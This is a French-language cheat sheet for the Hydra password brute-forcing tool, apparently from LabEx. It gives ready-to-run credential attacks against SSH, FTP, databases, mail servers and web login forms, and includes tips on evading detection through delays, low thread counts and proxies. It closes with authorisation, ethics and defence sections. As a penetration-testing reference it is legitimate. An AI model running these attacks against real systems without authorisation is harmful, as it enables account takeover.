---
title: 'Fiche Mémo Hydra'
description: 'Apprenez Hydra avec notre fiche mémo complète couvrant les commandes essentielles, les concepts et les meilleures pratiques.'
pdfUrl: '/cheatsheets/pdf/hydra-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Feuille de triche Hydra
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/fr/learn/hydra">Apprenez Hydra avec des Labs Pratiques</a>
</base-disclaimer-title>
<base-disclaimer-content>
Apprenez le cassage de mots de passe et les tests d'intrusion avec Hydra grâce à des laboratoires pratiques et des scénarios réels. LabEx propose des cours complets sur Hydra couvrant les attaques de protocoles, l'exploitation de formulaires web, l'optimisation des performances et l'utilisation éthique. Maîtrisez les techniques de force brute pour les tests de sécurité autorisés et les évaluations de vulnérabilités.
</base-disclaimer-content>
</base-disclaimer>

## Syntaxe de Base et Installation

### Installation : `sudo apt install hydra`

Hydra est généralement préinstallé sur Kali Linux mais peut être installé sur d'autres distributions.

```bash
# Installer sur les systèmes Debian/Ubuntu
sudo apt install hydra
# Installer sur d'autres systèmes
sudo apt-get install hydra
# Vérifier l'installation
hydra -h
# Vérifier les protocoles supportés
hydra
```

### Syntaxe de Base : `hydra [options] cible service`

Syntaxe de base : `hydra -l <nom_utilisateur> -P <fichier_mots_de_passe> <protocole_cible>://<adresse_cible>`

```bash
# Nom d'utilisateur unique, liste de mots de passe
hydra -l username -P passwords.txt target.com ssh
# Liste de noms d'utilisateur, liste de mots de passe
hydra -L users.txt -P passwords.txt target.com ssh
# Nom d'utilisateur unique, mot de passe unique
hydra -l admin -p password123 192.168.1.100 ftp
```

### Options Principales : `-l`, `-L`, `-p`, `-P`

Spécifiez les noms d'utilisateur et les mots de passe pour les attaques par force brute.

```bash
# Options de nom d'utilisateur
-l username          # Nom d'utilisateur unique
-L userlist.txt      # Fichier de liste de noms d'utilisateur
# Options de mot de passe
-p password          # Mot de passe unique
-P passwordlist.txt  # Fichier de liste de mots de passe
# Emplacement courant des listes de mots de passe
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
```

### Options de Sortie : `-o`, `-b`

Enregistrez les résultats dans un fichier pour une analyse ultérieure.

```bash
# Enregistrer les résultats dans un fichier
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# Format de sortie JSON
hydra -l admin -P passwords.txt target.com ssh -b json
# Sortie verbeuse
hydra -l admin -P passwords.txt target.com ssh -V
```

## Attaques Spécifiques aux Protocoles

### SSH : `hydra cible ssh`

Attaquer les services SSH avec des combinaisons de noms d'utilisateur et de mots de passe.

```bash
# Attaque SSH de base
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
# Noms d'utilisateur multiples
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
# Port SSH personnalisé
hydra -l admin -P passwords.txt 192.168.1.100 -s 2222 ssh
# Avec threading
hydra -l root -P passwords.txt -t 6 ssh://192.168.1.100
```

### FTP : `hydra cible ftp`

Force brute des identifiants de connexion FTP.

```bash
# Attaque FTP de base
hydra -l admin -P passwords.txt ftp://192.168.1.100
# Vérification FTP anonyme
hydra -l anonymous -p "" ftp://192.168.1.100
# Port FTP personnalisé
hydra -l user -P passwords.txt -s 2121 192.168.1.100 ftp
```

### Attaques de Bases de Données : `mysql`, `postgres`, `mssql`

Attaquer les services de bases de données par force brute d'identifiants.

```bash
# Attaque MySQL
hydra -l root -P passwords.txt 192.168.1.100 mysql
# Attaque PostgreSQL
hydra -l postgres -P passwords.txt 192.168.1.100 postgres
# Attaque MSSQL
hydra -l sa -P passwords.txt 192.168.1.100 mssql
# Attaque MongoDB
hydra -l admin -P passwords.txt 192.168.1.100 mongodb
```

### SMTP/Email : `hydra cible smtp`

Attaquer l'authentification du serveur de messagerie.

```bash
# Force brute SMTP
hydra -l admin -P passwords.txt smtp://mail.target.com
# Avec mots de passe nuls/vides
hydra -P passwords.txt -e ns -V -s 25 smtp.target.com smtp
# Attaque IMAP
hydra -l user -P passwords.txt imap://mail.target.com
```

## Attaques d'Applications Web

### Formulaires POST HTTP : `http-post-form`

Attaquer les formulaires de connexion web en utilisant la méthode HTTP POST avec les espaces réservés `^USER^` et `^PASS^`.

```bash
# Attaque de formulaire POST de base
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Avec message d'erreur personnalisé
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password"
# Avec condition de succès
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/admin:username=^USER^&password=^PASS^:S=Dashboard"
```

### Formulaires GET HTTP : `http-get-form`

Similaire aux formulaires POST mais cible les requêtes GET au lieu de cela.

```bash
# Attaque de formulaire GET
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
# Avec en-têtes personnalisés
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/auth:user=^USER^&pass=^PASS^:F=Error:H=Cookie: session=abc123"
```

### Authentification Basique HTTP : `http-get`/`http-post`

Attaquer les serveurs web utilisant l'authentification basique HTTP.

```bash
# Authentification Basique HTTP
hydra -l admin -P passwords.txt http-get://192.168.1.100
# Authentification Basique HTTPS
hydra -l admin -P passwords.txt https-get://secure.target.com
# Avec chemin personnalisé
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin
```

### Attaques Web Avancées

Gérer les applications web complexes avec des jetons CSRF et des cookies.

```bash
# Avec gestion des jetons CSRF
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Error:H=Cookie: csrf=^CSRF^"
# Avec cookies de session
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"
```

## Options de Performance et de Threading

### Threading : `-t` (Tâches)

Contrôler le nombre de connexions d'attaque simultanées pendant l'attaque.

```bash
# Threading par défaut (16 tâches)
hydra -l admin -P passwords.txt target.com ssh
# Nombre de threads personnalisé
hydra -l admin -P passwords.txt -t 4 target.com ssh
# Attaque haute performance (à utiliser avec prudence)
hydra -l admin -P passwords.txt -t 64 target.com ssh
# Threading conservateur (pour éviter la détection)
hydra -l admin -P passwords.txt -t 1 target.com ssh
```

### Temps d'Attente : `-w` (Délai)

Ajouter des délais entre les tentatives pour éviter la limitation du débit et la détection.

```bash
# Attendre 30 secondes entre les tentatives
hydra -l admin -P passwords.txt -w 30 target.com ssh
# Combiné avec le threading
hydra -l admin -P passwords.txt -t 2 -w 10 target.com ssh
# Délai aléatoire (1-5 secondes)
hydra -l admin -P passwords.txt -W 5 target.com ssh
```

### Multiples Cibles : `-M` (Fichier de Cibles)

Attaquer plusieurs hôtes en les spécifiant dans un fichier.

```bash
# Créer un fichier de cibles
echo "192.168.1.100" > targets.txt
echo "192.168.1.101" >> targets.txt
echo "192.168.1.102" >> targets.txt
# Attaquer plusieurs cibles
hydra -L users.txt -P passwords.txt -M targets.txt ssh
# Avec threading personnalisé par cible
hydra -L users.txt -P passwords.txt -M targets.txt -t 2 ssh
```

### Options de Reprise et d'Arrêt

Reprendre les attaques interrompues et contrôler le comportement d'arrêt.

```bash
# Arrêter après le premier succès
hydra -l admin -P passwords.txt -f target.com ssh
# Reprendre l'attaque précédente
hydra -R
# Créer un fichier de restauration
hydra -l admin -P passwords.txt -I restore.txt target.com ssh
```

## Fonctionnalités Avancées et Options

### Génération de Mots de Passe : `-e` (Tests Additionnels)

Tester automatiquement des variations de mots de passe supplémentaires.

```bash
# Tester les mots de passe nuls
hydra -l admin -e n target.com ssh
# Tester le nom d'utilisateur comme mot de passe
hydra -l admin -e s target.com ssh
# Tester le nom d'utilisateur inversé
hydra -l admin -e r target.com ssh
# Combiner toutes les options
hydra -l admin -e nsr -P passwords.txt target.com ssh
```

### Format Séparé par Deux-Points : `-C`

Utiliser des combinaisons nom_utilisateur:mot_de_passe pour réduire le temps d'attaque.

```bash
# Créer un fichier d'identifiants
echo "admin:admin" > creds.txt
echo "root:password" >> creds.txt
echo "user:123456" >> creds.txt
# Utiliser le format deux-points
hydra -C creds.txt target.com ssh
# Plus rapide que de tester toutes les combinaisons
```

### Support Proxy : `HYDRA_PROXY`

Utiliser des serveurs proxy pour les attaques via des variables d'environnement.

```bash
# Proxy HTTP
export HYDRA_PROXY=connect://proxy.example.com:8080
hydra -l admin -P passwords.txt target.com ssh
# Proxy SOCKS4 avec authentification
export HYDRA_PROXY=socks4://user:pass@127.0.0.1:1080
# Proxy SOCKS5
export HYDRA_PROXY=socks5://proxy.example.com:1080
```

### Optimisation des Listes de Mots de Passe : `pw-inspector`

Utiliser pw-inspector pour filtrer les listes de mots de passe en fonction des politiques.

```bash
# Filtrer les mots de passe (min 6 caractères, 2 classes de caractères)
cat passwords.txt | pw-inspector -m 6 -c 2 -n > filtered.txt
# Utiliser la liste filtrée avec Hydra
hydra -l admin -P filtered.txt target.com ssh
# Supprimer les doublons d'abord
cat passwords.txt | sort | uniq > unique_passwords.txt
```

## Utilisation Éthique et Bonnes Pratiques

### Directives Légales et Éthiques

Il est possible d'utiliser Hydra à la fois légalement et illégalement. Obtenez une autorisation et une approbation appropriées avant d'effectuer des attaques par force brute.

```text
N'effectuer des attaques que sur des systèmes pour lesquels une autorisation explicite a été obtenue
Assurez-vous toujours d'avoir l'autorisation explicite du propriétaire ou de l'administrateur du système
Documentez toutes les activités de test pour la conformité
Utiliser uniquement lors de tests d'intrusion autorisés
Ne jamais utiliser pour des tentatives d'accès non autorisées
```

### Mesures Défensives

Défendez-vous contre les attaques par force brute avec des mots de passe forts et des politiques appropriées.

```text
Mettre en œuvre des politiques de verrouillage de compte pour bloquer temporairement les comptes après des tentatives échouées
Utiliser l'authentification multi-facteurs (MFA)
Mettre en œuvre des systèmes CAPTCHA pour empêcher les outils d'automatisation
Surveiller et journaliser les tentatives d'authentification
Mettre en œuvre la limitation du débit et le blocage d'IP
```

### Bonnes Pratiques de Test

Commencez avec des paramètres conservateurs et documentez toutes les activités pour la transparence.

```text
Commencer avec de faibles nombres de threads pour éviter la perturbation du service
Utiliser des listes de mots de passe appropriées à l'environnement cible
Tester pendant les fenêtres de maintenance approuvées lorsque cela est possible
Surveiller les performances du système cible pendant les tests
Avoir des procédures de réponse aux incidents prêtes
```

### Cas d'Utilisation Courants

Les équipes rouges et bleues bénéficient toutes deux des audits de mots de passe, des évaluations de sécurité et des tests d'intrusion.

```text
Cassage de mots de passe pour identifier les mots de passe faibles et évaluer la robustesse des mots de passe
Audits de sécurité des services réseau
Tests d'intrusion et évaluations de vulnérabilités
Tests de conformité pour les politiques de mots de passe
Démonstrations de formation et éducatives
```

## Alternative GUI et Outils Supplémentaires

### XHydra : Interface Graphique

XHydra est une interface graphique pour Hydra qui permet de sélectionner la configuration via des contrôles graphiques au lieu des commutateurs de ligne de commande.

```bash
# Lancer l'interface graphique XHydra
xhydra
# Installer si non disponible
sudo apt install hydra-gtk
# Fonctionnalités :
# - Interface cliquable
# - Modèles d'attaque préconfigurés
# - Surveillance visuelle de la progression
# - Sélection facile de la cible et de la liste de mots de passe
```

### Hydra Wizard : Configuration Interactive

Assistant interactif qui guide les utilisateurs dans la configuration d'hydra avec des questions simples.

```bash
# Lancer l'assistant interactif
hydra-wizard
# L'assistant demande :
# 1. Service à attaquer
# 2. Cible à attaquer
# 3. Nom d'utilisateur ou fichier de noms d'utilisateur
# 4. Mot de passe ou fichier de mots de passe
# 5. Tests de mots de passe supplémentaires
# 6. Numéro de port
# 7. Confirmation finale
```

### Listes de Mots de Passe par Défaut : `dpl4hydra`

Générer des listes de mots de passe par défaut pour des marques et systèmes spécifiques.

```bash
# Rafraîchir la base de données de mots de passe par défaut
dpl4hydra refresh
# Générer une liste pour une marque spécifique
dpl4hydra cisco
dpl4hydra netgear
dpl4hydra linksys
# Utiliser les listes générées
hydra -C dpl4hydra_cisco.lst 192.168.1.1 ssh
# Toutes les marques
dpl4hydra all
```

### Intégration avec d'Autres Outils

Combiner Hydra avec des outils de reconnaissance et d'énumération.

```bash
# Combiner avec la découverte de services Nmap
nmap -sV 192.168.1.0/24 | grep -E "(ssh|ftp|http)"
# Utiliser avec les résultats d'énumération de noms d'utilisateur
enum4linux 192.168.1.100 | grep "user:" > users.txt
# Intégrer avec les listes de mots de passe Metasploit
ls /usr/share/wordlists/metasploit/
```

## Dépannage et Performance

### Problèmes Courants et Solutions

Résoudre les problèmes typiques rencontrés lors de l'utilisation d'Hydra.

```bash
# Erreurs de temps d'attente de connexion
hydra -l admin -P passwords.txt -t 1 -w 30 target.com ssh
# Erreur trop de connexions
hydra -l admin -P passwords.txt -t 2 target.com ssh
# Optimisation de l'utilisation de la mémoire
hydra -l admin -P small_list.txt target.com ssh
# Vérifier les protocoles supportés
hydra
# Rechercher le protocole dans la liste des services supportés
```

### Optimisation des Performances

Optimiser les listes de mots de passe et les trier par probabilité pour des résultats plus rapides.

```bash
# Trier les mots de passe par probabilité
hydra -l admin -P passwords.txt -u target.com ssh
# Supprimer les doublons
sort passwords.txt | uniq > clean_passwords.txt
# Optimiser le threading en fonction de la cible
# Réseau local : -t 16
# Cible Internet : -t 4
# Service lent : -t 1
```

### Formats de Sortie et Analyse

Différents formats de sortie pour l'analyse des résultats et le reporting.

```bash
# Sortie texte standard
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# Format JSON pour l'analyse
hydra -l admin -P passwords.txt target.com ssh -b json -o results.json
# Sortie verbeuse pour le débogage
hydra -l admin -P passwords.txt target.com ssh -V
# Sortie uniquement succès
hydra -l admin -P passwords.txt target.com ssh | grep "password:"
```

### Surveillance des Ressources

Surveiller les ressources système et réseau pendant les attaques.

```bash
# Surveiller l'utilisation du CPU
top -p $(pidof hydra)
# Surveiller les connexions réseau
netstat -an | grep :22
# Surveiller l'utilisation de la mémoire
ps aux | grep hydra
# Limiter l'impact sur le système
nice -n 19 hydra -l admin -P passwords.txt target.com ssh
```

## Liens Pertinents

- <router-link to="/kali">Feuille de triche Kali Linux</router-link>
- <router-link to="/cybersecurity">Feuille de triche Cybersécurité</router-link>
- <router-link to="/nmap">Feuille de triche Nmap</router-link>
- <router-link to="/wireshark">Feuille de triche Wireshark</router-link>
- <router-link to="/comptia">Feuille de triche CompTIA</router-link>
- <router-link to="/linux">Feuille de triche Linux</router-link>
- <router-link to="/shell">Feuille de triche Shell</router-link>
- <router-link to="/devops">Feuille de triche DevOps</router-link>
